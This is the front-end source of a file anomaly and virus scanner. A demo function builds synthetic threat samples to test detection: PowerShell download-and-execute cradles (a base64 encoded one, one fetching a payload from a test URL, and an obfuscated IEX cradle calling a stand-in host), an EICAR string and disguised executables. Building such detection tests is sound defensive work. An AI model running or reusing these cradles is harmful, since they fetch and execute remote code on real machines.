import React, { useState, useEffect, useCallback } from 'react';
import './App.css';
import FolderUploadSection from './components/FolderUploadSection';
import DropZoneOverlay from './components/DropZoneOverlay';
import ConsoleDashboard from './components/ConsoleDashboard';
import AnomalyTable from './components/AnomalyTable';
import SecuritySettingsModal from './components/SecuritySettingsModal';
import { checkBackendHealth, uploadAndScanFiles, fetchSecuritySettings } from './utils/apiService';

export default function App() {
  const [folderPath, setFolderPath] = useState('');
  const [fileItems, setFileItems] = useState([]);
  const [logs, setLogs] = useState([
    `[${new Date().toLocaleTimeString()}] [SYSTEM] File Anomaly Scanner console initialized.`,
    `[${new Date().toLocaleTimeString()}] [READY] Recursive Directory Entries API and threat intelligence ready.`
  ]);
  const [report, setReport] = useState(null);
  const [isScanning, setIsScanning] = useState(false);
  const [backendOnline, setBackendOnline] = useState(null);
  const [securitySettings, setSecuritySettings] = useState(null);
  const [isSettingsOpen, setIsSettingsOpen] = useState(false);

  const addLog = useCallback((message) => {
    const timestamp = new Date().toLocaleTimeString();
    setLogs((prev) => [...prev, `[${timestamp}] ${message}`]);
  }, []);

  const loadSettings = useCallback(async () => {
    try {
      const s = await fetchSecuritySettings();
      if (s) {
        setSecuritySettings(s);
        const vtStatus = s.virusTotalConfigured && s.virusTotalEnabled
          ? 'Active'
          : !s.virusTotalConfigured
          ? 'Not Configured (Lookup Links Available)'
          : 'Disabled';
        const sbStatus = s.safeBrowsingConfigured && s.safeBrowsingEnabled
          ? 'Active'
          : !s.safeBrowsingConfigured
          ? 'Not Configured'
          : 'Disabled';
        addLog(`[CONFIG] Threat Intel — VirusTotal: ${vtStatus} | Safe Browsing: ${sbStatus}.`);
      }
    } catch {
      // Backend may be starting
    }
  }, [addLog]);

  useEffect(() => {
    async function verifyBackend() {
      const isUp = await checkBackendHealth();
      setBackendOnline(isUp);
      if (isUp) {
        addLog('[BACKEND] Connected to ASP.NET Core Web API on http://localhost:5000.');
        await loadSettings();
      } else {
        addLog('[BACKEND] [WARN] Cannot reach backend API. Ensure FileAnomalyScanner is running on port 5000.');
      }
    }
    verifyBackend();
  }, [addLog, loadSettings]);

  const handleFilesDiscovered = (discoveredFolderName, discoveredFiles) => {
    setFolderPath(discoveredFolderName);
    setFileItems(discoveredFiles);
  };

  const handleClear = () => {
    setFolderPath('');
    setFileItems([]);
    setReport(null);
    addLog('[RESET] Upload queue and anomaly tables cleared.');
  };

  const handleClearLogs = () => {
    setLogs([`[${new Date().toLocaleTimeString()}] [CONSOLE] Logs cleared by user.`]);
  };

  const handleStartScan = async () => {
    if (fileItems.length === 0) {
      addLog('[SCAN] [WARN] Please select or drop a folder first.');
      return;
    }

    setIsScanning(true);
    addLog(`[SCAN] [START] Initiating anomaly & virus scan for ${fileItems.length} file(s)...`);

    try {
      const scanReport = await uploadAndScanFiles(fileItems, (progress) => {
        addLog(`[PROGRESS] ${progress.status}`);
      });

      setReport(scanReport);

      if (scanReport.consoleLogs && scanReport.consoleLogs.length > 0) {
        setLogs((prev) => [...prev, ...scanReport.consoleLogs]);
      }

      addLog(`[SCAN] [COMPLETE] Processed ${scanReport.summary.totalFilesScanned} files. Found ${scanReport.summary.totalAnomaliesFound} total findings (VT detections: ${scanReport.summary.virusTotalFlaggedCount || 0}, Safe Browsing: ${scanReport.summary.safeBrowsingThreatCount || 0}).`);
    } catch (err) {
      addLog(`[SCAN] [ERROR] Scan failed: ${err.message}`);
    } finally {
      setIsScanning(false);
    }
  };

  const handleLoadDemoFolder = () => {
    // 1. Clean file
    const cleanText = new File(
      ["This is a legitimate plain text configuration file with normal entropy."],
      "config.txt",
      { type: "text/plain" }
    );

    // 2. High entropy
    const randomBytes = new Uint8Array(2048);
    window.crypto.getRandomValues(randomBytes);
    const highEntropyText = new File([randomBytes], "audit_notes.txt", { type: "text/plain" });

    // 3. Masqueraded PE in PNG
    const mzPngBytes = new Uint8Array([0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]);
    const disguisedPng = new File([mzPngBytes], "logo_banner.png", { type: "image/png" });

    // 4. Double extension deceptive executable
    const doubleExt = new File(["MZ... payload header"], "Q3_Financial_Report.pdf.exe", { type: "application/octet-stream" });

    // 5. Encoded PowerShell cradle
    const scriptCradle = new File([
      "powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA="
    ], "deploy_updater.ps1", { type: "text/plain" });

    // 6. EICAR Standard Antivirus Test File (Official harmless AV test signature for VirusTotal testing)
    const eicarString = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
    const eicarFile = new File([eicarString], "eicar_antivirus_test.com.txt", { type: "text/plain" });

    // 7. Script containing official Google Safe Browsing Malware test URL
    const safeBrowsingTestScript = new File([
      `# Automated updater script\n$dropUrl = "http://testsafebrowsing.appspot.com/s/malware.html"\nWrite-Host "Fetching remote payload from $dropUrl"\n(New-Object System.Net.WebClient).DownloadFile($dropUrl, "stage2.bin")\n`
    ], "updater_c2_test.ps1", { type: "text/plain" });

    // 8. Obfuscated PowerShell cradle testing AST evasion resistance (concatenation & backticks)
    const astObfuscatedScript = new File([
      `# Obfuscated Dynamic Memory Cradle (Tests AST parser vs regex evasion)\n$wc = New-Object System.Net.WebClient\n$wc.('Down' + 'load' + 'String').Invoke('http://suspicious-endpoint.local/stage.ps1')\n& (\`I\`Ex) ('Write-Host "Unpacked Memory Stage"')\n`
    ], "obfuscated_cradle.ps1", { type: "text/plain" });

    const demoItems = [
      { file: cleanText, relativePath: "DemoFolder/documents/config.txt" },
      { file: highEntropyText, relativePath: "DemoFolder/documents/audit_notes.txt" },
      { file: disguisedPng, relativePath: "DemoFolder/assets/logo_banner.png" },
      { file: doubleExt, relativePath: "DemoFolder/downloads/Q3_Financial_Report.pdf.exe" },
      { file: scriptCradle, relativePath: "DemoFolder/scripts/deploy_updater.ps1" },
      { file: eicarFile, relativePath: "DemoFolder/threats/eicar_antivirus_test.com.txt" },
      { file: safeBrowsingTestScript, relativePath: "DemoFolder/scripts/updater_c2_test.ps1" },
      { file: astObfuscatedScript, relativePath: "DemoFolder/scripts/obfuscated_cradle.ps1" }
    ];

    setFolderPath("DemoFolder");
    setFileItems(demoItems);
    addLog("[DEMO] Injected 8 test files: EICAR Antivirus Test, Google Safe Browsing test URL, AST Obfuscated PowerShell Cradle, PE masquerade, high entropy TXT, double extension .pdf.exe, base64 cradle, and clean config.");
  };

  return (
    <div className="app-container">
      {/* App Header */}
      <header className="app-header">
        <div className="app-title-area">
          <div className="title-with-badge">
            <h1>File Anomaly &amp; Virus Scanner</h1>
            <span className="version-pill">v2.5 Threat Intel &amp; AST</span>
          </div>
          <div className="app-subtitle">
            Zero-OOM Streaming Heuristics + PowerShell AST Engine + VirusTotal v3 &amp; Safe Browsing
          </div>
        </div>

        <div className="header-actions">
          {/* Threat Intel Status Badges */}
          <div className="threat-intel-indicators">
            <span
              className={`threat-pill ${
                securitySettings?.virusTotalConfigured && securitySettings?.virusTotalEnabled
                  ? 'pill-active'
                  : !securitySettings?.virusTotalConfigured
                  ? 'pill-unconfigured'
                  : 'pill-disabled'
              }`}
              title={
                securitySettings?.virusTotalConfigured
                  ? `VirusTotal v3 Active (${securitySettings.maskedVirusTotalApiKey})`
                  : 'VirusTotal Key Missing (Click API Settings to add)'
              }
            >
              VT: {securitySettings?.virusTotalConfigured && securitySettings?.virusTotalEnabled
                ? 'Active'
                : !securitySettings?.virusTotalConfigured
                ? 'Hash Only'
                : 'Disabled'}
            </span>

            <span
              className={`threat-pill ${
                securitySettings?.safeBrowsingConfigured && securitySettings?.safeBrowsingEnabled
                  ? 'pill-active'
                  : !securitySettings?.safeBrowsingConfigured
                  ? 'pill-unconfigured'
                  : 'pill-disabled'
              }`}
              title={
                securitySettings?.safeBrowsingConfigured
                  ? `Google Safe Browsing v4 Active (${securitySettings.maskedSafeBrowsingApiKey})`
                  : 'Google Safe Browsing Key Missing (Click API Settings to add)'
              }
            >
              Safe Browsing: {securitySettings?.safeBrowsingConfigured && securitySettings?.safeBrowsingEnabled
                ? 'Active'
                : !securitySettings?.safeBrowsingConfigured
                ? 'No Key'
                : 'Disabled'}
            </span>
          </div>

          <button
            type="button"
            className="btn btn-settings"
            onClick={() => setIsSettingsOpen(true)}
            title="Configure VirusTotal and Google Safe Browsing API Keys"
          >
            ⚙️ API Settings
          </button>

          <span
            className={`backend-status-pill ${
              backendOnline === true
                ? 'status-online'
                : backendOnline === false
                ? 'status-offline'
                : ''
            }`}
          >
            Backend: {backendOnline === true ? 'Online (Port 5000)' : backendOnline === false ? 'Offline' : 'Checking...'}
          </span>

          <button
            type="button"
            className="btn btn-sm btn-demo"
            onClick={handleLoadDemoFolder}
            disabled={isScanning}
          >
            🧪 Load Synthetic Test Folder
          </button>
        </div>
      </header>

      {/* Top Folder Upload UI */}
      <FolderUploadSection
        folderPath={folderPath}
        setFolderPath={setFolderPath}
        fileItems={fileItems}
        setFileItems={setFileItems}
        onStartScan={handleStartScan}
        onClear={handleClear}
        isScanning={isScanning}
        addLog={addLog}
      />

      {/* Drag & Drop Area */}
      <DropZoneOverlay
        onFilesDiscovered={handleFilesDiscovered}
        isScanning={isScanning}
        addLog={addLog}
      />

      {/* Scrolling Console Log Window */}
      <ConsoleDashboard logs={logs} onClearLogs={handleClearLogs} />

      {/* Anomaly & Threat Results Table */}
      <AnomalyTable
        anomalies={report ? report.anomalies : []}
        summary={report ? report.summary : null}
        files={report ? report.files : []}
        fileItems={fileItems}
        onLog={addLog}
      />

      {/* Security API Settings Modal */}
      <SecuritySettingsModal
        isOpen={isSettingsOpen}
        onClose={() => setIsSettingsOpen(false)}
        onSettingsUpdated={(updated) => {
          setSecuritySettings(updated);
          addLog('[CONFIG] Threat intelligence API settings updated.');
        }}
      />
    </div>
  );
}
